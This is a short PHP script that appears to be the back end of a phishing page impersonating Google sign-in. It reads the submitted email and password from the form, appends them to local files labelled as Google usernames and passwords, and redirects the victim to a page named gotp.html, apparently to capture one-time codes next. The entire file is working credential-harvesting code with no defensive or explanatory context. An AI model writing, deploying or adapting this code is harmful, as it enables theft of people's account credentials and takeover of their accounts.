<?php

file_put_contents("usernames.txt", "Google Username : : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Google Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: gotp.html');
?>
